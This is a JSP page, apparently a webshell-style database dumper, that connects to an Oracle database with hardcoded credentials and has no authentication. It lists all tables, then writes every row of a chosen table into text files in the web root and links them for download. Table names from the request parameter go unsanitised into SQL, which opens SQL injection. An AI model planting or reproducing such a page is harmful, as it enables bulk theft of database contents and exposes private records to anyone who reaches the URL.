<%@ page language="java" import="java.util.*"  pageEncoding="GBK"%>

<%@ page import="oracle.jdbc.*"%>

<%@ page import="java.sql.*" %>

<%@ page contentType="text/html; charset=GBK" %>

<%@ page import="java.io.*" %>

<%

String path = request.getContextPath();

String basePath = request.getScheme()+"://"+request.getServerName()+":"+request.getServerPort()+path+"/";

%>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">

<html>

  <head>

    <base href="<%=basePath%>">

    

    <title>XXOO</title>

        <meta http-equiv="pragma" content="no-cache">

        <meta http-equiv="cache-control" content="no-cache">

        <meta http-equiv="expires" content="0">    

        <meta http-equiv="keywords" content="keyword1,keyword2,keyword3">

        <meta http-equiv="description" content="This is my page">

        <!--

        <link rel="stylesheet" type="text/css" href="styles.css" mce_href="styles.css">

        -->

  </head>

  

  <body> 

    <%

        String  url  =  "http://"  +  request.getServerName()  +  ":"  +  request.getServerPort()  +  request.getContextPath()+request.getServletPath();

        Class.forName("oracle.jdbc.driver.OracleDriver").newInstance();

        ResultSet rs=null;

        ResultSet rs_column=null;

        ResultSet rs_dump=null;

        String oraUrl="jdbc:oracle:thin:@192.168.1.81:1521:db";

        String oraUser="username";

        String oraPWD="password";

        int size=30000;

        try

        {

                DriverManager.registerDriver(new oracle.jdbc.driver.OracleDriver());

        }        

        catch (SQLException e){

                out.print("filed!!");

        }

    try

        {

                Connection conn=DriverManager.getConnection(oraUrl,oraUser,oraPWD);

                conn.setAutoCommit(false);

                if (request.getParameter("table") == null || request.getParameter("table").equals(""))

                {

                        out.print("xixi...<br>");

                        Statement stmt=conn.createStatement(ResultSet.TYPE_SCROLL_SENSITIVE,ResultSet.CONCUR_UPDATABLE);

                        rs=stmt.executeQuery("select table_name from all_tables");

                        while(rs.next())

                        {

                                out.print("<a href=");out.print(url);out.print("?table=");out.print(rs.getString(1));

                                out.print(" target=_blank>");out.print(rs.getString(1));out.print("</a><br>");

                        }

                        rs.close();

                        stmt.close();

                }

                else

                {

                        out.print("Current table : "+request.getParameter("table"));

                        String sql_count="select count(*) from all_tab_columns where Table_Name='"+request.getParameter("table")+"'";

                        String sql_column="select * from all_tab_columns where Table_Name='"+request.getParameter("table")+"'";

                        String sql_columns_count="select count(*) from "+request.getParameter("table");

                        //String sql_dump="select rownom ro,* from T_SYS_USER";

                        Statement stmt_count=conn.createStatement(ResultSet.TYPE_SCROLL_SENSITIVE,ResultSet.CONCUR_UPDATABLE);

                        Statement stmt_column=conn.createStatement(ResultSet.TYPE_SCROLL_SENSITIVE,ResultSet.CONCUR_UPDATABLE);

                        Statement stmt_columns_count=conn.createStatement(ResultSet.TYPE_SCROLL_SENSITIVE,ResultSet.CONCUR_UPDATABLE);

                        rs=stmt_count.executeQuery(sql_count);

                        rs_column=stmt_column.executeQuery(sql_column); 

                        ResultSet rs_columns_count=null;

                        rs_columns_count=stmt_columns_count.executeQuery(sql_columns_count); 

                        

                        conn.commit();

                        int count=0;

                        while(rs.next())

                        {

                                count=Integer.parseInt(rs.getString(1));

                                //out.print(count);

                        }

                        int columns_count=0;

                        while(rs_columns_count.next())                                // Total number of records

                        {

                                columns_count=Integer.parseInt(rs_columns_count.getString(1));

                                out.print("<br>The number of records : "+columns_count+"<br>");

                        }

                        //out.print(columns_count);

                        int column_num=1;

                        //out.print("<table border='1'>");out.print("<tr>");

                        String sql_dump="select * from (select rownum ro ";                //SELECT 

                        while(rs_column.next())

                        {

                                //out.print(rs_column.getString(3));out.print("\r");

                                sql_dump+=",";                                

                                sql_dump+=rs_column.getString(3);

                                column_num+=1;

                                

                        }

                        rs_column.close();

                        rs.close();                        //close

                        stmt_count.close();

                        stmt_column.close();

                        sql_dump+=" from "+request.getParameter("table")+" where rownum<=";

                        int mark=0;

                        mark=columns_count;

                        out.print("<br><br><br>Please download:<br>");

                        while(true)

                        {

                                if(mark<=size)                                //one txt count

                                {        mark=0;                }

                                else

                                {        mark=mark-size;        }

                                String dump=sql_dump+columns_count+") where ro>="+mark;

                                columns_count-=size;

                                Statement stmt_dump=conn.createStatement(ResultSet.TYPE_SCROLL_SENSITIVE,ResultSet.CONCUR_UPDATABLE);

                                rs_dump= stmt_dump.executeQuery(dump);

                                conn.commit();

                                String filename = request.getRealPath(request.getParameter("table")+"-"+mark+".txt");

                                java.io.File f = new java.io.File(filename);

                                if(!f.exists())

                                { f.createNewFile(); }

                                try

                                {

                                        PrintWriter pw = new PrintWriter(new FileOutputStream(filename));

                                        while(rs_dump.next())

                                        {

                                                column_num=1;

                                                while(column_num<=count)

                                                {

                                                        pw.print(rs_dump.getString(column_num));

                                                        pw.print(",");

                                                        column_num+=1;

                                                }

                                                pw.println("");

                                        }

                                        pw.close();

                                }

                                catch(IOException e) {

                                out.println(e.getMessage());

                                }

                                out.println("<br><a href=./"+request.getParameter("table")+"-"+mark+".txt>"+request.getParameter("table")+"-"+mark+".txt</a><br>");

                                if(mark==0)

                                {

                                        rs_dump.close();

                                        stmt_dump.close();

                                        break;

                                }

                        }

                }

                conn.close();

            } catch (SQLException e)

            {

                    System.out.println(e.toString());

                    out.print(e.toString());

                }

     %>

  </body>



</html>
